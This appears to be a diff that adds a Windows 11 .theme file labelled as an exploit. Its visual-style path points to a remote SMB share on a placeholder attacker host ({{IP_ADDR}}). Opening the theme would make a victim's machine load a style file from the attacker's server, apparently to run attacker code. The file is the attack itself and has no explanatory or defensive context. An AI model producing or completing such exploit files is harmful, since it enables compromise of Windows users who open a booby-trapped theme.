@@ -1,0 +1,17 @@
+; windows 11 theme exploit
+; copyright 2023 fukin software foundation
+[Theme]
+DisplayName=@%SystemRoot%\System32\themeui.dll,-2060
+
+[Control Panel\Desktop]
+Wallpaper=%SystemRoot%\web\wallpaper\Windows\img0.jpg
+TileWallpaper=0
+WallpaperStyle=10
+
+[VisualStyles]
+Path=\\{{IP_ADDR}}\tb\Aero.msstyles
+ColorStyle=NormalColor
+Size=NormalSize
+
+[MasterThemeSelector]
+MTSM=RJSPBS
